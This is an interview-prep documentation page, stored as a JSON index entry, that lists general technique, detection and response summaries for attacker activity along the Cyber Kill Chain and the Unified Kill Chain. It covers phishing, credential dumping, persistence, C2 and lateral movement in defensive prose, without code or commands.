[{"id":0,"href":"/docs/InterviewPrep/Defensive/DetectionTechniques/","title":"Detection Techniques","section":"Defensive","content":" Based on Cyber Kill Chain # 1. Reconnaissance # Hunting for Open Ports using PowerShell: Technique: Attackers scan for open ports as initial reconnaissance to discover services they can exploit. Detection: Develop scripts to log and analyze port scanning activities and alert on anomalies compared to baseline port usage. Response: Block or limit access to unused ports, implement network segmentation, and regularly audit network services. Hunting Network Connections: Technique: Monitoring connections can reveal attempts to reach known bad domains or unusual external systems, indicating reconnaissance or data exfiltration attempts. Detection: Use network traffic analysis tools to flag new, unexpected, or unauthorized connections. Response: Block connections to known malicious IPs and domains, and implement network whitelisting. Hunting Metasploit: Technique: Using Metasploit for initial scanning and probing. Detection: Detect signatures of Metasploit payloads and modules in network traffic, and monitor for suspicious endpoint behavior that correlates with common Metasploit tactics. Response: Isolate and investigate systems showing signs of Metasploit activity, and update defenses to mitigate known Metasploit exploits. Hunting for Common Enumeration Techniques: Technique: Attackers use tools like Nmap and Nessus to enumerate network services and vulnerabilities. Detection: Monitor for high volumes of network traffic and unusual patterns indicative of enumeration tools. Response: Conduct regular internal vulnerability assessments to understand the attack surface and apply necessary patches. Hunting DNS Requests: Technique: Attackers often use DNS requests to resolve command and control servers or gather information about the network. Detection: Analyze DNS query logs for unusual domain lookups and patterns that deviate from normal behavior. Response: Block suspicious domains, implement DNS filtering solutions, and configure alerting for high-risk domain queries. Hunting Social Media and Public Data Leaks: Technique: Attackers gather information from social media profiles and public data sources. Detection: Monitor social media and public forums for mentions of your organization, and use digital risk protection services. Response: Educate employees on safe social media practices, and take down exposed sensitive information from public sites. OSINT Gathering: Technique: Collecting information from publicly available sources about the target organization. Detection: Monitor social media, public forums, and other platforms for mentions of the organization or key personnel. Response: Educate employees about the risks of oversharing information and implement policies to minimize exposure. DNS Reconnaissance: Technique: Querying DNS records to gather information about the target’s infrastructure. Detection: Monitor DNS query logs for patterns indicative of reconnaissance activities. Response: Implement DNS security measures such as DNSSEC, and regularly audit DNS records for unnecessary exposure. 2. Weaponization \u0026amp; Delivery # Detecting File Creation: Technique: Delivery of malware via document downloads or email attachments. Detection: Implement file integrity monitoring to detect the creation of new files, especially executable or script types, and scan them with antivirus software. Response: Quarantine suspicious files immediately, alert relevant teams, and conduct a thorough scan of the affected system. Detecting Malicious Email Attachments: Technique: Embedding malicious code in email attachments. Detection: Use email security gateways and sandboxing to analyze attachments for malicious behavior. Response: Block emails with malicious attachments, educate users on the dangers of opening unknown attachments, and update email filtering rules. Detecting Malicious Links: Technique: Sending links to malicious websites that host exploit kits or malware. Detection: Implement URL filtering and threat intelligence to block known malicious domains. Response: Train users to recognize and avoid clicking on suspicious links, and use browser isolation techniques. Detecting Exploit Kits: Technique: Use of exploit kits to deliver malware through vulnerabilities in web browsers or plugins. Detection: Monitor for indicators of exploit kit activity, such as unusual web traffic patterns or known exploit kit signatures. Response: Patch vulnerable software promptly, use virtual patching for web applications, and employ intrusion prevention systems (IPS). Spear-Phishing Attachments: Technique: Crafting tailored emails with malicious attachments targeting specific individuals. Detection: Use advanced email security solutions to scan attachments for malicious content and employ sandboxing techniques. Response: Train employees to recognize and report suspicious emails, and configure email filters to block malicious attachments. Drive-By Downloads: Technique: Compromising websites to deliver malware when a user visits the site. Detection: Implement web filtering solutions to block access to known malicious websites and use browser security settings to prevent automatic downloads. Response: Regularly update web browsers and plugins to patch vulnerabilities, and educate users on the risks of visiting untrusted websites. 3. Exploitation # Detecting Mimikatz: Technique: Extracting plaintext passwords, hash values, and Kerberos tickets from memory. Detection: Monitor access to the LSASS process and detect typical Mimikatz command patterns or memory access behaviors. Response: Implement endpoint protection solutions, restrict access to sensitive processes, and immediately isolate affected systems for forensic analysis. Hunting Abnormal LSASS Behavior and Detecting LSASS Behavior with PowerShell: Technique: Unusual interaction with the LSASS process indicating credential dumping attempts. Detection: Implement rules in SIEM systems to alert on atypical accesses to LSASS, and use PowerShell scripts to check LSASS process integrity and behavior. Response: Investigate and remediate abnormal behavior, update security policies to restrict LSASS access, and educate users on secure password handling. Detecting Exploits Against Web Applications: Technique: Exploiting vulnerabilities in web applications to gain unauthorized access or execute malicious code. Detection: Use web application firewalls (WAFs) to detect and block malicious requests, and monitor application logs for signs of exploitation. Response: Regularly update and patch web applications, conduct security assessments, and implement secure coding practices. Detecting Brute Force Attacks: Technique: Repeatedly trying different passwords to gain unauthorized access. Detection: Monitor for excessive login attempts and failed authentication requests. Response: Implement account lockout policies, use MFA, and analyze login patterns to identify and block brute force attempts. Exploitation of User Credentials: Technique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts, particularly from unfamiliar locations or devices. Response: Enforce strong password policies, implement multi-factor authentication (MFA), and reset compromised credentials immediately. 4. Installation # Hunting Malware: Technique: Installation of executables, DLLs, or scripts to maintain attacker presence. Detection: Regular scans with updated antivirus definitions, anomaly detection for new processes or service installations, and behavioral analysis for known malware tactics. Response: Quarantine detected malware, conduct a root cause analysis to understand how it was installed, and enhance defenses to prevent recurrence. Hunting RATS and C2 Servers: Technique: RATs establish persistence and facilitate remote access. Detection: Monitor outbound connections for traffic to known C2 infrastructure, unusual periodic traffic patterns, or unrecognized encryption protocols. Response: Block known C2 IP addresses and domains, isolate affected systems, and perform a full security audit to identify and close entry points. Hunting for Common Back Connect Ports with PowerShell: Technique: Specific network ports used by malware for outbound connections. Detection: Use PowerShell to scan for and log connections on suspicious ports, with real-time alerts for unexpected activity. Response: Block unauthorized ports, review firewall rules, and implement network segmentation to limit lateral movement. Detecting Malicious Scheduled Tasks: Technique: Using scheduled tasks to execute malicious code at specific times. Detection: Monitor for the creation of new scheduled tasks and changes to existing tasks. Response: Review and delete unauthorized scheduled tasks, and audit task creation policies. Detecting Startup Persistence Mechanisms: Technique: Modifying startup settings to ensure malware runs when the system starts. Detection: Monitor startup folders, registry keys, and system services for changes. Response: Remove unauthorized startup entries, reinforce access controls, and educate users on avoiding actions that enable persistence. Fileless Malware: Technique: Using legitimate system tools to execute malicious activities without writing files to disk. Detection: Monitor system behavior for anomalies, such as unusual use of PowerShell or WMI. Response: Implement application whitelisting and restrict the use of system tools to authorized personnel. Malicious Browser Extensions: Technique: Installing browser extensions that perform malicious actions. Detection: Monitor for the installation of unauthorized browser extensions and unusual browser activity. Response: Educate users on the risks of installing untrusted extensions, and implement browser security policies to control extension installations. 5. Command and Control (C2) # Persistence: Hunting Startup Persistence: Technique: Techniques involving registry keys, startup folder items, scheduled tasks, or services to reload malware after restarts. Detection: Monitor and audit startup directories, task scheduler, service list, and registry startup keys for unexpected entries. Response: Remove unauthorized startup entries, reinforce access controls, and educate users on avoiding actions that enable persistence. Hunting Registry Key Persistence: Technique: Using the registry to maintain persistence or configure software in a way that benefits the attacker. Detection: Regularly audit registry keys commonly used for persistence and use tools to detect hidden or obfuscated keys. Response: Remove malicious registry keys, update policies to prevent unauthorized changes, and monitor registry activities for suspicious behavior. Hunting for Command and Control (C2) Traffic: Technique: Establishing communication channels with compromised systems. Detection: Monitor network traffic for known C2 patterns, beaconing behavior, and traffic to suspicious domains. Response: Block identified C2 traffic, isolate compromised systems, and conduct a thorough investigation to identify and remove malware. Detecting DNS Tunneling: Technique: Using DNS queries to exfiltrate data or establish C2 channels. Detection: Analyze DNS traffic for unusual query patterns and payload sizes. Response: Implement DNS filtering and response policies, and block or sinkhole malicious domains. Domain Generation Algorithms (DGAs): Technique: Using algorithms to generate a large number of domain names for C2 communication. Detection: Monitor DNS traffic for patterns indicative of DGAs and use threat intelligence feeds to identify known malicious domains. Response: Block identified domains at the firewall, and implement DNS filtering solutions to prevent communication with DGA-generated domains. Beaconing: Technique: Regularly sending signals to a C2 server to check for instructions. Detection: Use network monitoring tools to identify beaconing patterns, such as regular, periodic outbound connections. Response: Investigate and block the source of beaconing traffic, and update firewall rules to prevent future connections. 6. Actions on Objectives # Data Exfiltration: Technique: Stealing sensitive data from compromised systems. Detection: Monitor for large, unusual data transfers and use Data Loss Prevention (DLP) solutions to detect and block unauthorized data movements. Analyze outbound traffic for abnormal patterns. Response: Identify and isolate the source of exfiltration, mitigate the leak, review and enhance data access policies, and conduct a post-incident analysis to understand the breach and prevent recurrence. Detecting Evasion Techniques: Hunting Alternate Data Streams (ADS): Technique: Hiding files/data from normal file browsing tools. Detection: Scan file systems for hidden streams and monitor file system API calls for signs of ADS creation. Response: Remove hidden streams, reinforce file system monitoring, and educate users on secure file handling practices. Detecting Remote Threads: Technique: Injecting code into other processes via remote threads. Detection: Monitor for unexpected thread creation, especially from external processes into critical system processes. Response: Terminate malicious threads, isolate affected processes, and perform a security review to prevent future injection attempts. Detecting Evasion Techniques with PowerShell: Technique: Using PowerShell to execute code directly in memory, modify system logs, or alter security settings. Detection: Log and monitor PowerShell execution policies, command line inputs, and scripts run, focusing on encoded or obfuscated commands. Response: Restrict PowerShell usage, implement logging and monitoring for all PowerShell activities, and update security policies to mitigate risks. Privilege Escalation: Technique: Gaining elevated access to perform unauthorized actions. Detection: Monitor for abnormal behavior such as the creation of new admin accounts or changes to existing accounts. Use behavioral analytics to detect deviations from normal user activity. Response: Immediately remove elevated access, investigate the source of the escalation, and apply security patches to prevent the exploit from being reused. Impact and Sabotage: Technique: Disrupting services, deleting data, or otherwise causing harm to the organization. Detection: Monitor system logs for unusual deletion activities, service disruptions, or unauthorized configuration changes. Response: Isolate affected systems, restore from backups, conduct a thorough incident review, and enhance monitoring and protection mechanisms to prevent recurrence. Based on Unified Kill Chain # 1. Reconnaissance # Hunting for Open Ports using PowerShell:\nTechnique: Attackers scan for open ports to discover services they can exploit. Detection: Develop scripts to log and analyze port scanning activities and alert on anomalies compared to baseline port usage. Response: Block or limit access to unused ports, implement network segmentation, and regularly audit network services. Hunting Network Connections:\nTechnique: Monitoring connections to reveal attempts to reach known bad domains or unusual external systems. Detection: Use network traffic analysis tools to flag new, unexpected, or unauthorized connections. Response: Block connections to known malicious IPs and domains, and implement network whitelisting. Hunting Metasploit:\nTechnique: Using Metasploit for initial scanning and probing. Detection: Detect signatures of Metasploit payloads and modules in network traffic, and monitor for suspicious endpoint behavior. Response: Isolate and investigate systems showing signs of Metasploit activity, and update defenses to mitigate known Metasploit exploits. Hunting for Common Enumeration Techniques:\nTechnique: Attackers use tools like Nmap and Nessus to enumerate network services and vulnerabilities. Detection: Monitor for high volumes of network traffic and unusual patterns indicative of enumeration tools. Response: Conduct regular internal vulnerability assessments to understand the attack surface and apply necessary patches. Hunting DNS Requests:\nTechnique: Attackers use DNS requests to resolve command and control servers or gather information about the network. Detection: Analyze DNS query logs for unusual domain lookups and patterns that deviate from normal behavior. Response: Block suspicious domains, implement DNS filtering solutions, and configure alerting for high-risk domain queries. Hunting Social Media and Public Data Leaks:\nTechnique: Attackers gather information from social media profiles and public data sources. Detection: Monitor social media and public forums for mentions of your organization, and use digital risk protection services. Response: Educate employees on safe social media practices, and take down exposed sensitive information from public sites. OSINT Gathering:\nTechnique: Collecting information from publicly available sources about the target organization. Detection: Monitor social media, public forums, and other platforms for mentions of the organization or key personnel. Response: Educate employees about the risks of oversharing information and implement policies to minimize exposure. DNS Reconnaissance:\nTechnique: Querying DNS records to gather information about the target’s infrastructure. Detection: Monitor DNS query logs for patterns indicative of reconnaissance activities. Response: Implement DNS security measures such as DNSSEC, and regularly audit DNS records for unnecessary exposure. 2. Resource Development # Hunting for Credential Dumping Tools:\nTechnique: Using tools like Mimikatz to extract passwords and hashes from memory. Detection: Monitor for execution of known credential dumping tools and abnormal access to sensitive processes like LSASS. Response: Implement endpoint protection solutions, restrict access to sensitive processes, and isolate affected systems for forensic analysis. Detecting Malware Compilers:\nTechnique: Development and compilation of custom malware. Detection: Monitor for the use of common compilers and development environments used to create malware. Response: Isolate development environments from production networks and monitor for suspicious compilations. Detecting Malicious Email Campaigns:\nTechnique: Crafting and distributing phishing emails to gather credentials or deliver malware. Detection: Use email security solutions to detect and block phishing attempts and monitor for unusual email patterns. Response: Educate users on phishing threats and implement email filtering rules. Detecting Rogue Infrastructure:\nTechnique: Setting up command and control servers and other malicious infrastructure. Detection: Use threat intelligence to identify and monitor rogue domains and IP addresses. Response: Block access to known malicious infrastructure and monitor for attempts to connect to suspicious domains. Hunting Malicious Code Repositories:\nTechnique: Storing and sharing malicious code through public or private repositories. Detection: Monitor for access to known malicious repositories and inspect repositories for suspicious code. Response: Block access to malicious repositories and implement code review policies. Hunting Compromised Accounts:\nTechnique: Using compromised accounts to gain further access or distribute malware. Detection: Monitor for unusual login attempts and access patterns. Response: Reset compromised credentials and implement multi-factor authentication. Hunting for Exploit Kits:\nTechnique: Developing or purchasing exploit kits to deliver malware. Detection: Monitor for traffic indicative of exploit kit use and analyze suspicious files. Response: Patch vulnerable software and block known exploit kit domains. 3. Delivery # Detecting Malicious Email Attachments:\nTechnique: Embedding malicious code in email attachments. Detection: Use email security gateways and sandboxing to analyze attachments for malicious behavior. Response: Block emails with malicious attachments and educate users on the dangers of opening unknown attachments. Detecting Malicious Links:\nTechnique: Sending links to malicious websites that host exploit kits or malware. Detection: Implement URL filtering and threat intelligence to block known malicious domains. Response: Train users to recognize and avoid clicking on suspicious links and use browser isolation techniques. Drive-By Downloads:\nTechnique: Compromising websites to deliver malware when a user visits the site. Detection: Implement web filtering solutions to block access to known malicious websites and use browser security settings to prevent automatic downloads. Response: Regularly update web browsers and plugins to patch vulnerabilities and educate users on the risks of visiting untrusted websites. Watering Hole Attacks:\nTechnique: Compromising a site likely to be visited by the target to deliver malware. Detection: Monitor for unusual activity on commonly visited sites and use threat intelligence to identify compromised sites. Response: Block access to compromised sites and educate users on safe browsing practices. USB-Based Malware:\nTechnique: Using infected USB drives to deliver malware. Detection: Monitor for new USB device connections and scan for malware. Response: Educate users on the risks of using untrusted USB devices and implement USB usage policies. Malvertising:\nTechnique: Using malicious advertisements to deliver malware. Detection: Use ad blockers and monitor for unusual web activity. Response: Block access to known malvertising networks and educate users on the risks of clicking on ads. Supply Chain Attacks:\nTechnique: Compromising a third-party supplier to deliver malware. Detection: Monitor for unusual activity from third-party software and services. Response: Conduct security assessments of suppliers and implement monitoring for third-party services. Spear-Phishing Attachments:\nTechnique: Crafting tailored emails with malicious attachments targeting specific individuals. Detection: Use advanced email security solutions to scan attachments for malicious content and employ sandboxing techniques. Response: Train employees to recognize and report suspicious emails and configure email filters to block malicious attachments. 4. Social Engineering # Pretexting:\nTechnique: Creating a fabricated scenario to obtain information or access. Detection: Educate employees on social engineering tactics and monitor for unusual requests for sensitive information. Response: Implement verification processes for sensitive requests and conduct regular social engineering awareness training. Baiting:\nTechnique: Offering something enticing to lure victims into a trap. Detection: Monitor for suspicious offers or emails and educate users on the risks of accepting unknown offers. Response: Block known baiting attempts and reinforce policies against engaging with unknown offers. Quid Pro Quo:\nTechnique: Offering a service or benefit in exchange for information. Detection: Monitor for unusual requests for information and educate users on the risks of exchanging information for services. Response: Implement strict information sharing policies and verify all requests for information. Tailgating:\nTechnique: Following someone into a secure area without proper authorization. Detection: Use physical security measures like badge access and educate employees on the importance of not allowing tailgating. Response: Implement policies for reporting tailgating incidents and reinforce physical security measures. Vishing:\nTechnique: Using phone calls to deceive individuals into revealing information. Detection: Monitor for unusual phone activity and educate users on the risks of sharing information over the phone. Response: Implement verification processes for sensitive information shared over the phone and conduct regular awareness training. Smishing:\nTechnique: Using SMS messages to deceive individuals into revealing information. Detection: Monitor for suspicious SMS messages and educate users on the risks of sharing information via SMS. - Response: Block known malicious SMS senders and reinforce policies against sharing sensitive information via SMS.\nShoulder Surfing:\nTechnique: Observing someone’s screen to gather information. Detection: Educate employees on the risks of shoulder surfing and monitor for unusual behavior in workspaces. Response: Implement privacy screens and conduct awareness training on securing screens in public areas. Impersonation:\nTechnique: Pretending to be someone else to gain access or information. Detection: Educate employees on impersonation tactics and monitor for unusual requests for access or information. Response: Implement verification processes for identity and conduct regular awareness training. 5. Exploitation # Exploiting Vulnerabilities in Web Applications:\nTechnique: Using known vulnerabilities to gain unauthorized access or execute malicious code. Detection: Use web application firewalls (WAFs) to detect and block malicious requests and monitor application logs for signs of exploitation. Response: Regularly update and patch web applications, conduct security assessments, and implement secure coding practices. Exploiting Software Vulnerabilities:\nTechnique: Using vulnerabilities in software to gain access or escalate privileges. Detection: Monitor for signs of exploitation and use intrusion detection systems (IDS) to detect suspicious activity. Response: Patch software promptly and use virtual patching to mitigate vulnerabilities. Exploiting Configuration Weaknesses:\nTechnique: Taking advantage of weak or misconfigured settings to gain access. Detection: Conduct regular security assessments and monitor for configuration changes. Response: Implement secure configuration policies and regularly audit configurations. Exploiting Insecure APIs:\nTechnique: Using vulnerabilities in APIs to gain unauthorized access. Detection: Monitor API traffic for signs of exploitation and use API gateways to enforce security policies. Response: Secure APIs with authentication and authorization controls and regularly test for vulnerabilities. Exploiting Buffer Overflows:\nTechnique: Using buffer overflow vulnerabilities to execute arbitrary code. Detection: Monitor for signs of buffer overflow attacks and use security solutions to detect and block them. Response: Apply patches and updates to vulnerable software and use security coding practices to prevent buffer overflows. Exploiting Weak Authentication:\nTechnique: Using weak or compromised authentication mechanisms to gain access. Detection: Monitor for unusual login attempts and use multi-factor authentication (MFA). Response: Implement strong authentication policies and regularly review and update them. Exploiting Privilege Escalation Vulnerabilities:\nTechnique: Using vulnerabilities to gain elevated privileges. Detection: Monitor for signs of privilege escalation and use security solutions to detect and block them. Response: Apply patches and updates to vulnerable software and use security best practices to prevent privilege escalation. Exploiting Credential Reuse:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts and use MFA. Response: Implement strong password policies and educate users on the risks of credential reuse. 6. Persistence # Hunting Malware:\nTechnique: Installation of executables, DLLs, or scripts to maintain attacker presence. Detection: Regular scans with updated antivirus definitions, anomaly detection for new processes or service installations, and behavioral analysis for known malware tactics. Response: Quarantine detected malware, conduct a root cause analysis to understand how it was installed, and enhance defenses to prevent recurrence. Hunting RATS and C2 Servers:\nTechnique: RATs establish persistence and facilitate remote access. Detection: Monitor outbound connections for traffic to known C2 infrastructure, unusual periodic traffic patterns, or unrecognized encryption protocols. Response: Block known C2 IP addresses and domains, isolate affected systems, and perform a full security audit to identify and close entry points. Hunting for Common Back Connect Ports with PowerShell:\nTechnique: Specific network ports used by malware for outbound connections. Detection: Use PowerShell to scan for and log connections on suspicious ports, with real-time alerts for unexpected activity. Response: Block unauthorized ports, review firewall rules, and implement network segmentation to limit lateral movement. Detecting Malicious Scheduled Tasks:\nTechnique: Using scheduled tasks to execute malicious code at specific times. Detection: Monitor for the creation of new scheduled tasks and changes to existing tasks. Response: Review and delete unauthorized scheduled tasks, and audit task creation policies. Detecting Startup Persistence Mechanisms:\nTechnique: Modifying startup settings to ensure malware runs when the system starts. Detection: Monitor startup folders, registry keys, and system services for changes. Response: Remove unauthorized startup entries, reinforce access controls, and educate users on avoiding actions that enable persistence. Fileless Malware:\nTechnique: Using legitimate system tools to execute malicious activities without writing files to disk. Detection: Monitor system behavior for anomalies, such as unusual use of PowerShell or WMI. Response: Implement application whitelisting and restrict the use of system tools to authorized personnel. Malicious Browser Extensions:\nTechnique: Installing browser extensions that perform malicious actions. Detection: Monitor for the installation of unauthorized browser extensions and unusual browser activity. Response: Educate users on the risks of installing untrusted extensions, and implement browser security policies to control extension installations. Hunting Registry Key Persistence:\nTechnique: Using the registry to maintain persistence or configure software in a way that benefits the attacker. Detection: Regularly audit registry keys commonly used for persistence and use tools to detect hidden or obfuscated keys. Response: Remove malicious registry keys, update policies to prevent unauthorized changes, and monitor registry activities for suspicious behavior. 7. Defense Evasion # Hunting Alternate Data Streams (ADS):\nTechnique: Hiding files/data from normal file browsing tools. Detection: Scan file systems for hidden streams and monitor file system API calls for signs of ADS creation. Response: Remove hidden streams, reinforce file system monitoring, and educate users on secure file handling practices. Detecting Remote Threads:\nTechnique: Injecting code into other processes via remote threads. Detection: Monitor for unexpected thread creation, especially from external processes into critical system processes. Response: Terminate malicious threads, isolate affected processes, and perform a security review to prevent future injection attempts. Detecting Evasion Techniques with PowerShell:\nTechnique: Using PowerShell to execute code directly in memory, modify system logs, or alter security settings. Detection: Log and monitor PowerShell execution policies, command line inputs, and scripts run, focusing on encoded or obfuscated commands. Response: Restrict PowerShell usage, implement logging and monitoring for all PowerShell activities, and update security policies to mitigate risks. Detecting Obfuscated Files or Information:\nTechnique: Using obfuscation techniques to hide malicious code or data. Detection: Use static and dynamic analysis tools to detect obfuscation techniques in files and scripts. Response: Deobfuscate and analyze suspicious files, and update detection rules to recognize new obfuscation methods. Detecting Process Injection:\nTechnique: Injecting malicious code into legitimate processes. Detection: Monitor for abnormal memory modifications and the creation of new threads in existing processes. Response: Investigate and terminate malicious processes, and update security measures to prevent future injections. Hunting for Rootkits:\nTechnique: Using rootkits to hide malicious activities and maintain persistence. Detection: Use rootkit detection tools and monitor for signs of rootkit activity, such as hidden files and processes. Response: Remove detected rootkits, conduct a full system scan, and update security policies to prevent rootkit installations. Detecting Anti-Forensics Techniques:\nTechnique: Using techniques to prevent or hinder forensic analysis. Detection: Monitor for the use of anti-forensics tools and techniques, such as data wiping and encryption. Response: Investigate and counteract anti-forensics measures, and update policies to detect and prevent their use. Detecting Log Manipulation:\nTechnique: Altering or deleting logs to cover tracks. Detection: Monitor for unusual log activity and implement tamper-evident logging solutions. Response: Investigate and restore altered or deleted logs, and reinforce logging policies to ensure integrity. 8. Command \u0026amp; Control (C2) # Hunting for Command and Control (C2) Traffic: Technique: Establishing communication channels with compromised systems. Detection: Monitor network traffic for known C 2 patterns, beaconing behavior, and traffic to suspicious domains. - Response: Block identified C2 traffic, isolate compromised systems, and conduct a thorough investigation to identify and remove malware.\nDetecting DNS Tunneling:\nTechnique: Using DNS queries to exfiltrate data or establish C2 channels. Detection: Analyze DNS traffic for unusual query patterns and payload sizes. Response: Implement DNS filtering and response policies, and block or sinkhole malicious domains. Domain Generation Algorithms (DGAs):\nTechnique: Using algorithms to generate a large number of domain names for C2 communication. Detection: Monitor DNS traffic for patterns indicative of DGAs and use threat intelligence feeds to identify known malicious domains. Response: Block identified domains at the firewall, and implement DNS filtering solutions to prevent communication with DGA-generated domains. Beaconing:\nTechnique: Regularly sending signals to a C2 server to check for instructions. Detection: Use network monitoring tools to identify beaconing patterns, such as regular, periodic outbound connections. Response: Investigate and block the source of beaconing traffic, and update firewall rules to prevent future connections. Detecting C2 Over HTTPS:\nTechnique: Using HTTPS to encrypt C2 traffic and evade detection. Detection: Monitor for unusual HTTPS traffic patterns and use SSL inspection to analyze encrypted traffic. Response: Block identified malicious HTTPS traffic and implement SSL inspection policies. Detecting C2 Over Social Media:\nTechnique: Using social media platforms to communicate with C2 servers. Detection: Monitor for unusual social media activity and use threat intelligence to identify malicious accounts. Response: Block access to known malicious social media accounts and reinforce social media usage policies. Detecting C2 Over P2P Networks:\nTechnique: Using peer-to-peer networks for C2 communication. Detection: Monitor for unusual P2P traffic patterns and use threat intelligence to identify malicious P2P nodes. Response: Block identified malicious P2P traffic and implement P2P usage policies. Detecting C2 Over Custom Protocols:\nTechnique: Using custom protocols to evade detection. Detection: Monitor for unusual traffic patterns and use deep packet inspection (DPI) to analyze traffic. Response: Block identified malicious custom protocol traffic and update firewall rules to prevent future connections. 9. Pivoting # Detecting Lateral Movement:\nTechnique: Moving laterally within the network to gain access to additional systems. Detection: Monitor for unusual login attempts and access patterns, and use endpoint detection and response (EDR) solutions. Response: Isolate affected systems, reset credentials, and conduct a full security audit. Detecting Pass-the-Hash Attacks:\nTechnique: Using stolen hash values to authenticate without knowing the actual password. Detection: Monitor for unusual authentication attempts and use multi-factor authentication (MFA). Response: Reset compromised credentials and implement strong password policies. Detecting Pass-the-Ticket Attacks:\nTechnique: Using stolen Kerberos tickets to authenticate. Detection: Monitor for unusual Kerberos ticket activity and use MFA. Response: Reset compromised credentials and implement strong authentication policies. Detecting Remote Desktop Protocol (RDP) Usage:\nTechnique: Using RDP to move laterally within the network. Detection: Monitor for unusual RDP activity and use endpoint security solutions. Response: Restrict RDP usage and implement network segmentation. Detecting SMB Relay Attacks:\nTechnique: Using the Server Message Block (SMB) protocol to relay authentication requests. Detection: Monitor for unusual SMB activity and use network security solutions. Response: Block identified malicious SMB traffic and implement network segmentation. Detecting Remote File Copy:\nTechnique: Copying files remotely to facilitate lateral movement. Detection: Monitor for unusual file copy activity and use data loss prevention (DLP) solutions. Response: Block identified malicious file copy attempts and implement network segmentation. Detecting Windows Management Instrumentation (WMI) Usage:\nTechnique: Using WMI to execute commands on remote systems. Detection: Monitor for unusual WMI activity and use endpoint security solutions. Response: Restrict WMI usage and implement network segmentation. Detecting PowerShell Remoting:\nTechnique: Using PowerShell to execute commands on remote systems. Detection: Monitor for unusual PowerShell remoting activity and use endpoint security solutions. Response: Restrict PowerShell remoting usage and implement network segmentation. 10. Discovery # Detecting Network Scanning:\nTechnique: Scanning the network to discover devices and services. Detection: Monitor for unusual network scanning activity and use intrusion detection systems (IDS). Response: Block identified malicious scanning attempts and implement network segmentation. Detecting Account Enumeration:\nTechnique: Enumerating user accounts to identify targets. Detection: Monitor for unusual account enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong authentication policies. Detecting Group Policy Enumeration:\nTechnique: Enumerating group policies to understand security settings. Detection: Monitor for unusual group policy enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong security policies. Detecting File Share Enumeration:\nTechnique: Enumerating file shares to identify potential targets. Detection: Monitor for unusual file share enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong access controls. Detecting Software Inventory:\nTechnique: Enumerating installed software to identify vulnerabilities. Detection: Monitor for unusual software inventory activity and use endpoint security solutions. Response: Block identified malicious inventory attempts and implement strong security policies. Detecting System Information Discovery:\nTechnique: Gathering information about the system to identify targets. Detection: Monitor for unusual system information discovery activity and use endpoint security solutions. Response: Block identified malicious discovery attempts and implement strong security policies. Detecting Network Topology Discovery:\nTechnique: Mapping the network topology to identify targets. Detection: Monitor for unusual network topology discovery activity and use network security solutions. Response: Block identified malicious discovery attempts and implement network segmentation. Detecting Active Directory Enumeration:\nTechnique: Enumerating Active Directory to identify targets. Detection: Monitor for unusual Active Directory enumeration activity and use endpoint security solutions. Response: Block identified malicious enumeration attempts and implement strong security policies. 11. Privilege Escalation # Detecting Mimikatz:\nTechnique: Extracting plaintext passwords, hash values, and Kerberos tickets from memory. Detection: Monitor access to the LSASS process and detect typical Mimikatz command patterns or memory access behaviors. Response: Implement endpoint protection solutions, restrict access to sensitive processes, and immediately isolate affected systems for forensic analysis. Hunting Abnormal LSASS Behavior and Detecting LSASS Behavior with PowerShell:\nTechnique: Unusual interaction with the LSASS process indicating credential dumping attempts. Detection: Implement rules in SIEM systems to alert on atypical accesses to LSASS, and use PowerShell scripts to check LSASS process integrity and behavior. Response: Investigate and remediate abnormal behavior, update security policies to restrict LSASS access, and educate users on secure password handling. Detecting Exploits Against Web Applications:\nTechnique: Exploiting vulnerabilities in web applications to gain unauthorized access or execute malicious code. Detection: Use web application firewalls (WAFs) to detect and block malicious requests, and monitor application logs for signs of exploitation. Response: Regularly update and patch web applications, conduct security assessments, and implement secure coding practices. Detecting Brute Force Attacks:\nTechnique: Repeatedly trying different passwords to gain unauthorized access. Detection: Monitor for excessive login attempts and failed authentication requests. Response: Implement account lockout policies, use MFA, and analyze login patterns to identify and block brute force attempts. Exploitation of User Credentials:\nTechnique: Using stolen credentials to gain unauthorized access. Detection: Monitor for unusual login attempts, particularly from unfamiliar locations or devices. Response: Enforce strong password policies, implement multi-factor authentication (MFA), and reset compromised credentials immediately. Detecting Kerberoasting:\nTechnique: Extracting Kerberos service tickets to crack offline and retrieve plaintext passwords. Detection: Monitor for unusual Kerberos ticket requests and use honeypots to detect Kerberoasting attempts. - Response: Enforce strong password policies, implement monitoring for Kerberos activity, and update security policies.\nDetecting Token Impersonation:\nTechnique: Using stolen tokens to impersonate users and gain unauthorized access. Detection: Monitor for unusual token usage and access patterns. Response: Reset compromised tokens and implement strong authentication policies. Detecting Exploits for Privilege Escalation:\nTechnique: Using known exploits to gain elevated privileges. Detection: Monitor for signs of privilege escalation exploits and use endpoint security solutions. Response: Patch vulnerable software and implement strong security policies. 12. Execution # Detecting Malicious Scripts:\nTechnique: Using scripts to execute malicious actions. Detection: Monitor for unusual script activity and use endpoint security solutions. Response: Block identified malicious scripts and implement script execution policies. Detecting Exploit Kits:\nTechnique: Using exploit kits to deliver malware through vulnerabilities in web browsers or plugins. Detection: Monitor for indicators of exploit kit activity, such as unusual web traffic patterns or known exploit kit signatures. Response: Patch vulnerable software promptly, use virtual patching for web applications, and employ intrusion prevention systems (IPS). Detecting Malicious Macros:\nTechnique: Using macros in documents to execute malicious actions. Detection: Monitor for unusual macro activity and use endpoint security solutions. Response: Block identified malicious macros and implement macro execution policies. Detecting Scheduled Tasks:\nTechnique: Using scheduled tasks to execute malicious actions at specific times. Detection: Monitor for unusual scheduled task activity and use endpoint security solutions. Response: Block identified malicious scheduled tasks and implement task scheduling policies. Detecting PowerShell Execution:\nTechnique: Using PowerShell to execute malicious actions. Detection: Monitor for unusual PowerShell activity and use endpoint security solutions. Response: Block identified malicious PowerShell scripts and implement PowerShell execution policies. Detecting Command Line Execution:\nTechnique: Using command line tools to execute malicious actions. Detection: Monitor for unusual command line activity and use endpoint security solutions. Response: Block identified malicious command line activity and implement command line execution policies. Detecting WMI Execution:\nTechnique: Using WMI to execute malicious actions. Detection: Monitor for unusual WMI activity and use endpoint security solutions. Response: Block identified malicious WMI scripts and implement WMI execution policies. Detecting Exploit Modules:\nTechnique: Using exploit modules to execute malicious actions. Detection: Monitor for unusual exploit module activity and use endpoint security solutions. Response: Block identified malicious exploit modules and implement exploit execution policies. 